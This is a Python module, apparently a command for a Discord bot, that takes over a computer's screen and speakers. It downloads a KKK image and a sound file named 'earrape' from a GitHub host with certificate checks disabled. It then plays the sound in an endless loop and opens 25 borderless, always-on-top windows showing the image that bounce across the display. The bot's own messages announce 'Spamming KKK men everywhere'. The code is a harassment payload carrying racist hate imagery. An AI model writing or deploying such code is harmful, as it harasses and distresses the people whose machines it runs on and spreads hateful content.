import tkinter as tk
import random
import requests
from PIL import Image, ImageTk
from io import BytesIO
import threading
import time
import pygame
import asyncio

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
BASE_SPEED = 12
MULTIPLIER = 5
IMAGE_URL = "https://raw.githubusercontent.com/RayWZW/assets/main/kkk.png"
SOUND_URL = "https://github.com/RayWZW/assets/raw/main/earrape.mp3"

async def kkk_setup(ctx, action='start'):
    if action == 'start':
        await ctx.send("Spamming KKK men everywhere...")
    elif action == 'stop':
        await ctx.send("Stopping the KKK men...")

    # Run the blocking code in a separate thread
    await ctx.bot.loop.run_in_executor(None, start_kkk, action)

def start_kkk(action):
    if action == 'start':
        root = tk.Tk()
        root.withdraw()
        image = download_image(IMAGE_URL)
        download_sound(SOUND_URL)
        threading.Thread(target=play_sound, daemon=True).start()
        windows = []
        for _ in range(25):
            x_speed = random.choice([-BASE_SPEED * MULTIPLIER, BASE_SPEED * MULTIPLIER])
            y_speed = random.choice([-BASE_SPEED * MULTIPLIER, BASE_SPEED * MULTIPLIER])
            window = BouncingWindow(root, image, x_speed, y_speed)
            windows.append(window)
        root.mainloop()
    elif action == 'stop':
        for window in BouncingWindow.instances:
            window.running = False
            window.window.destroy()
        pygame.mixer.music.stop()
        BouncingWindow.instances.clear()

def download_image(url):
    response = requests.get(url, verify=False)
    image = Image.open(BytesIO(response.content))
    return image

def download_sound(url):
    response = requests.get(url, verify=False)
    with open("earrape.mp3", "wb") as f:
        f.write(response.content)

def play_sound():
    pygame.mixer.init()
    pygame.mixer.music.load("earrape.mp3")
    pygame.mixer.music.play(-1)
    while True:
        time.sleep(1)

class BouncingWindow:
    instances = []

    def __init__(self, master, image, x_speed, y_speed):
        self.master = master
        self.image = ImageTk.PhotoImage(image.resize((WINDOW_WIDTH, WINDOW_HEIGHT)))
        self.window = tk.Toplevel(master)
        self.window.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}+{random.randint(0, master.winfo_screenwidth() - WINDOW_WIDTH)}+{random.randint(0, master.winfo_screenheight() - WINDOW_HEIGHT)}")
        self.window.overrideredirect(True)
        self.window.wm_attributes("-topmost", True)
        self.label = tk.Label(self.window, image=self.image)
        self.label.pack()
        self.x_speed = x_speed
        self.y_speed = y_speed
        self.running = True
        BouncingWindow.instances.append(self)
        threading.Thread(target=self.update_position, daemon=True).start()

    def update_position(self):
        while self.running:
            x, y = self.window.winfo_x(), self.window.winfo_y()
            screen_width = self.master.winfo_screenwidth()
            screen_height = self.master.winfo_screenheight()

            if x + self.x_speed < 0 or x + self.x_speed > screen_width - WINDOW_WIDTH:
                self.x_speed = -self.x_speed
            if y + self.y_speed < 0 or y + self.y_speed > screen_height - WINDOW_HEIGHT:
                self.y_speed = -self.y_speed

            self.window.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}+{int(x + self.x_speed)}+{int(y + self.y_speed)}")
            time.sleep(0.016)
